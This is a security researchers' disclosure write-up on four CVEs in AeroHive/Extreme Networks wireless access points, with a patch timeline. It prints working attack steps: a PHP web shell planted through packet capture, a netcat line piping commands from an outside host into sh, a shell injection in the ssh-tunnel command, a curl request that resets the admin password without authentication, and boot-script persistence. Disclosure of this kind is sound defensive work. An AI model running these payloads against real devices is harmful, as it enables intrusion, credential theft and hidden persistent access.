# AeroHive writeup

During some browsing for cheap but somehow interesting hardware on the used market
we stumbled upon some wireless accesspoints by AeroHive / Extreme Networks with
which our university already had experience. They were available for a very good
price (~15€/AP) and after some googling we found out that they can also be used
without an external controller, so we bought a few to experiment with.

[This documentation](https://gist.github.com/samdoran/6bb5a37c31a738450c04150046c1c039)
on GitHub describes how to configure the APs, but it also includes a link to a
firmware image, which we immediately downloaded and started looking into, which
quickly resulted in us finding various issues.

This writeup documents our findings which ultimately resulted in four different CVEs
being issued. Most of the sections below describe a security problem on their own, but
in combination they contain everything from an authentication bypass, over reading
user passwords to persisting code execution over reboots and firmware upgrades.

## First root exploit (CVE-2025-27230)

First of all we should mention that this like a few of the other exploits we are
going to show only works for somebody already having admin privileges on the AP.
It just helps breaking out of the limited configuration shell into being able to
run any command on the underlying system, but as you can see
[later on in this write-up](#Full-authentication-bypass-CVE-2025-27227), we also
found a way to fully bypass the authentication, making these attacks way more
interesting.

The CVE number might change as there has been a slight communication issue with
this bug, resulting in Extreme Networks internal description seemingly mentioning
whats already filed under [CVE-2025-27227](#Full-authentication-bypass-CVE-2025-27227).

#### File inclusion via path injection

While looking through the files on the webserver we found that pages are accessed
via `AhBaseAction.class.php5`, which includes page specific files ending in `Access.class.php5`,
with the name being retrieved directly from the URL (`$pageName = $_REQUEST['_page']`).
This parameter is not being sanitized, so any file matching that naming scheme can be
included, possibly allowing code execution:

```php
protected function getAccess($pageName,$actionType) {
	$filename = $pageName.'Access.class.php5'; 
	$classname = $pageName.'Access';
	if (include_once $filename) {
[...]
```

Since the webserver is already running as root the injected code would also be
running as root.

We first tried including scripts from external sources and data URLs, but the
PHP config disabled all of those, so we needed to somehow get a file onto the AP.

#### Getting a payload onto the AP

We tried various ways on getting files onto the AP, most promising being the upload for
captive portal files, but the developers already thought about that and blocked files
ending in `.php5`.

In the end we found out that the firmware has functionality to capture data on
the wifi interfaces, allowing arbitrary filenames. We can set a filename using
`capture save interface wifi0 TestAccess.class.php5` and start the capture using
`capture interface wifi0 count 10`.
The capture will then be written to `/tmp/capture/TestAccess.class.php5`.

Flooding traffic to a device behind the AP while capturing allows us to write a PHP
payload to that file, e.g. using
`while true; do printf '<?php exec($_GET["cmd"]); die(); ?>' | nc -u 10.25.11.112 1337; done`.

Since PHP simply ignores or passes through everything that is outside of its start and end
markers it really didn't matter that the file effectively started with garbage (packet headers etc).

To finally run the payload we can simply access
`/action.php5?_action=get&_page=/tmp/capture/Test&cmd=nc+10.25.11.34+8888+|+sh` on the AP.
We had issues running larger commands this way, but using netcat to receive additional
shell commands worked very reliably for us. You could probably also just send over a
bigger payload during the capture process.

## Persisting root access (no CVE)

Gaining root access allowed us to write SSH authorized keys onto the AP for both
the admin user as well as the root user. We really liked that as a "feature",
so we wanted to find a way to persist our keys over reboots.

Looking around the bootup scripts we spotted the following snippet in `/opt/ah/etc/ah_start`:

```shell
#
# run per board start script
#
if [ -f /f/etc/ah_start_template ]; then
		/f/etc/ah_start_template
fi
```

Since files under `/f` are persistent we were able to write a small script creating
our authorized_keys file, which now gets executed on every boot.

The file also survived a firmware upgrade and at least one factory reset, even
though we were not able to reproduce that, it might be that this behaviour has
previously been fixed with some of the later firmwares we tried.

## Broken webserver authentication (no CVE)

During the work on the previous exploit we re-discovered a security vulnerability
where the code on the webserver is not actually verifying the authentication of the
current user, but rather creates a session file for the first successful login, which
later on can be reused by any session id, that's also why our examples just used `a`
as session id, it simply didn't matter.

After an admin has logged into the webinterface once, you can simply give yourself a
session cookie of your liking and you'll automatically be logged in.

We found mention of this vulnerability on multiple sources, but
[this writeup](https://research.aurainfosec.io/pentest/hacking-the-hive/#broken-authentication)
seems to explain it in most detail.

## Decrypting passwords ([CVE-2025-27228](https://extreme-networks.my.site.com/ExtrArticleDetail?an=000123646))

While exploring the implementation of various CLI commands we discovered a way of
decrypting various passwords stored on the AP using the reporting functionality.

Creating a reporting configuration using
`application reporting upload http://0 time-window 1 admin a password <password> basic`
with an encrypted password allows printing of the decrypted password using
`show application reporting configuration`.

This can easist be shown by example

```shell
AH-0cd6c0# user testuser
AH-0cd6c0# user testuser password test123
AH-0cd6c0# show run users password | include testuser
user testuser
user testuser password fwCYSPs7l92noOSJ2Drf4dc7eFlUB4aD6AoAc
AH-0cd6c0# application reporting upload http://0 time-window 1
           admin a password fwCYSPs7l92noOSJ2Drf4dc7eFlUB4aD6AoAc basic
AH-0cd6c0# show application reporting configuration
[...]
Application reporting password:			test123
[...]
```

We also tried decrypting the admin passwords, but it turned out that those passwords are
first MD5-hashed before being encrypted. Keep in mind that MD5 can easily be brute-forced
nowadays, even complex passwords with up to 10 characters can be cracked in under two
weeks on a single GPU.

## Left-over kernel dumps after factory reset (no CVE)

Exploring the flash on the AP using the previously gained root access we discovered some
left-over kdumps which haven't been erased during factory reset. These contained various
configuration snippets from the previous owner, including encrypted passwords.
Unfortunately it seems that the TPM of the AP is not re-initialized during factory
resets, so we were also able to decrypt those passwords.

Be advised that when selling or giving away your old devices you should make sure to erase
any existing kdumps, ideally after an initial factory reset to make sure nothing is stored
there during the reset process. List existing kdumps using `show _core flash`, delete them
one by one using `clear _core flash <core file name>` (or run a root exploit and delete
everything from `/f/kdump`).

## Second root exploit ([CVE-2025-27229](https://extreme-networks.my.site.com/ExtrArticleDetail?an=000123644))

Further exploring the firmware we were looking for directly executed commands that could
be accessed from the CLI and found a shell injection in the `ssh-tunnel` functionality,
which normally seems to be used to grant Extreme Networks staff access to the AP for
debugging purposes.

The command `ssh-tunnel server <server> tunnel-port <port> user <user> password <password>`
is being used to fill in the following template:
`sshpass -p <password> ssh <user>@<server> -p <port> <command>`, with the command being
pre-defined. Unforunately the password is not being sanitized, so including a space
character allows overriding of the originally executed `ssh` command.

To open a root shell run the following CLI command:
`ssh-tunnel server 0 tunnel-port 8080 user admin password "a sh -c sh"` it will seem to
hang at first, that's because two commands are being executed but only the output of the
second command is printed, so simply enter `exit` and you should drop into a shell
spawned by the second execution.

## Full authentication bypass ([CVE-2025-27227](https://extreme-networks.my.site.com/ExtrArticleDetail?an=000123648))

Up to now everything needed admin access, but further looking into the webserver
files we found `/cmn/clientmodessidsubmit.php5`, which configures an AP to connect
to an SSID as a client, probably for use as a relay or something like that.

The script doesn't verify authentication at all, so it could probably be used to
disrupt operation as is. Much worse is that input given to the script is being used
in a configuration template without sanitization:

```
client-mode ssid "<ssid>" passphrase <key_type> <pwd>
```

Including a newline character allows overriding of basically any configuration,
including the root-admin password. An example attack setting the password to
`Hunter1234` looks like this:

```shell
curl -v -k -H 'Cookie: PHPSESSID=a' \
  'https://10.25.11.163/cmn/clientmodessidsubmit.php5' -o - \
  -F 'button=Connect' -F 'type=1' -F 'ssid=fnord' \
  -F 'pwd=foobar%0aadmin root-admin admin password Hunter1234%0a' \
  -F 'auth=8' -F 'wpa_sec=1' -F 'hidden_ssid=0' -F 'key_type=fnord'
```

For stealth a root exploit can then be used to persist access, followed by a restore of
the previous configuration including the old admin password.

As a workaround for older accesspoints or deployments using an on-site hive-manager
without any further support you can disable the web-server using
`no system web-server hive-UI enable` (also available using the Network Policy
configuration in XIQ/HiveManager).

We'd generally recommend disabling the web-server as it is not needed for
day-to-day operation and introduces a large attack surface.

## Timeline

The timeline is a bit stretched. At first we didn't really know who to contact,
but luckily we knew somebody who was using the same type of accesspoints and
already had contact with their german support team.

Some of our responses were also a bit late since we were moving between offices
and all of the hardware had been packed away at some point.

We ran into a small annoyance when we tried asking about the current status and
our mails suddenly being rejected. Luckily the person who was sending mails our
way included her own personal mail footer at some point, so we had a direct
address to contact. As it turned out they restructured and created a
[PSIRT](https://www.extremenetworks.com/support/psirt) to make it easier to report
vulnerabilities in the future. Unfortunately they still do not offer any bug
bounties.

- 24.07.2024: Acquired used hardware (AP230) from eBay, started looking at firmware
- 24.07.2024: Found first root exploit (CVE-2025-27230)
- 26.07.2024: Found easier root exploit (CVE-2025-27229)
- 27.07.2024: Found authentication bypass (CVE-2025-27227)
- 27.07.2024: Started asking around for contact info (didn't find any online)
- 29.07.2024: Found way to decrypt user passwords (CVE-2025-27228)
- 14.08.2024: Got contact info for german support team of Extreme Networks
- 22.08.2024: Established contact, got offered an AP410C to verify findings with latest firmware
- 05.09.2024: Received AP410C and successfully validated attacks against latest firmware
- 05.09.2024: Established contact to Extreme Networks security team
- 05.11.2024: Received update that security team is working on patches
- 12.12.2024: Tried to clarify some of the findings
- 05.02.2025: Trying to contact security team again, contact address changed without info...
- 08.02.2025: Sent explanation video about some of the findings
- 21.02.2025: Finally got info that all issues have been identified and got assigned CVEs
- 26.02.2025: Extreme Networks published some of the issues, one remaining issue still open
- 02.04.2025: Published this writeup after verifying the most critical bugs had been patched
